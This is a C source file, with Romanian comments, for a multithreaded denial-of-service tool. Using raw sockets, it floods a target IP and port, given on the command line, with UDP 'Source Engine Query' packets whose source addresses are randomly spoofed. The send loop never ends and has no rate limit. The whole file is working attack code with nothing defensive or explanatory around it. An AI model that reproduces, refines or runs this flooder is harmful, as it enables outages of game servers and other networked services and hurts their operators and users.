#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <pthread.h>

#define LEN 512

typedef unsigned short u16;
typedef unsigned long u32;

unsigned short csum(unsigned short *buf, int nwords);
uint16_t udp_checksum(const struct iphdr *ip, const struct udphdr *udp, const uint16_t *buf);

// Structură pentru a transmite argumentele către thread
struct thread_args {
    char *DEST;
    int PDEST;
};

// Funcția care va fi executată de fiecare thread
void *send_udp_packets(void *args) {
    struct thread_args *thread_data = (struct thread_args *)args;
    char *DEST = thread_data->DEST;
    int PDEST = thread_data->PDEST;

    srand(time(NULL) ^ (pthread_self()));  // Srand pentru fiecare thread

    int s;
    struct sockaddr_in daddr, saddr;
    char packet[LEN];
    struct iphdr *ip = (struct iphdr *)packet;
    struct udphdr *udp = (struct udphdr *)((void *)ip + sizeof(struct iphdr));

    if ((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        perror("error:");
        pthread_exit(NULL);
    }

    daddr.sin_family = AF_INET;
    saddr.sin_family = AF_INET;
    daddr.sin_port = htons(PDEST);
    inet_pton(AF_INET, DEST, (struct in_addr *)&daddr.sin_addr.s_addr);
    
    memset(daddr.sin_zero, 0, sizeof(daddr.sin_zero));
    memset(saddr.sin_zero, 0, sizeof(saddr.sin_zero));
    memset(udp, 0, sizeof(struct udphdr));
    memset(ip, 0, sizeof(struct iphdr));

    ip->ihl = 5; // header length
    ip->version = 4;
    ip->tos = 0;
    ip->id = 0;
    ip->frag_off = 0;
    ip->ttl = 50 + (rand() % 50);
    ip->protocol = 17; // IPPROTO_UDP
    ip->check = 0;
    ip->daddr = daddr.sin_addr.s_addr;
    int PSOURCE = 27005 + (rand() % 1000);
    udp->source = htons(PSOURCE);

    int sizedata = 25;
    int sizeudpdata = sizeof(struct udphdr) + sizedata;
    ip->tot_len = htons(sizeudpdata + sizeof(struct iphdr));
    udp->len = htons(sizeudpdata);
    int sizepacket = sizeof(struct iphdr) + sizeudpdata;

    int optval = 1;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(int)) < 0) {
        perror("IP HDRINCL");
        pthread_exit(NULL);
    }

    while (1) {
        char ip_src[20];
        sprintf(ip_src, "%d.%d.%d.%d", 60 + (rand() % 40), rand() % 180, rand() % 254, rand() % 254);
        inet_pton(AF_INET, ip_src, (struct in_addr *)&saddr.sin_addr.s_addr);
        ip->saddr = saddr.sin_addr.s_addr;
        ip->id = (10000 + (rand() % 25000));
        ip->ttl = 50 + rand() % 100;

        memcpy(((void *)udp) + sizeof(struct udphdr), "\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00", sizedata);
        udp->check = 0;
        udp->check = udp_checksum(ip, udp, (const uint16_t *)udp);

        sendto(s, (char *)packet, sizepacket, 0, (struct sockaddr *)&daddr, (socklen_t)sizeof(daddr));
    }

    close(s);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        printf("- Usage: %s <IP> <Port> <NumThreads>\n", argv[0]);
        exit(1);
    }

    char *DEST = argv[1];
    int PDEST = atoi(argv[2]);
    int num_threads = atoi(argv[3]);

    pthread_t threads[num_threads];
    struct thread_args args;
    args.DEST = DEST;
    args.PDEST = PDEST;

    // Crearea thread-urilor
    for (int i = 0; i < num_threads; i++) {
        if (pthread_create(&threads[i], NULL, send_udp_packets, &args) != 0) {
            perror("Failed to create thread");
            exit(1);
        }
    }

    // Așteptăm să se termine toate thread-urile
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    return 0;
}

struct pseudo_hdr {
    u_int32_t source;
    u_int32_t dest;
    u_int8_t zero;
    u_int8_t protocol;
    u_int16_t udp_length;
};

uint16_t udp_checksum(const struct iphdr *ip, const struct udphdr *udp, const uint16_t *buf) {
    int calculated_length = ntohs(udp->len) % 2 == 0 ? ntohs(udp->len) : ntohs(udp->len) + 1;

    struct pseudo_hdr ps_hdr = {0};
    bzero(&ps_hdr, sizeof(struct pseudo_hdr));
    uint8_t data[sizeof(struct pseudo_hdr) + calculated_length];
    bzero(data, sizeof(struct pseudo_hdr) + calculated_length);

    ps_hdr.source = ip->saddr;
    ps_hdr.dest = ip->daddr;
    ps_hdr.protocol = IPPROTO_UDP;
    ps_hdr.udp_length = udp->len;

    memcpy(data, &ps_hdr, sizeof(struct pseudo_hdr));
    memcpy(data + sizeof(struct pseudo_hdr), buf, ntohs(udp->len));

    return csum((uint16_t *)data, sizeof(data) / 2);
}

unsigned short csum(unsigned short *buf, int nwords) {
    unsigned long sum;

    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return ~sum;
}
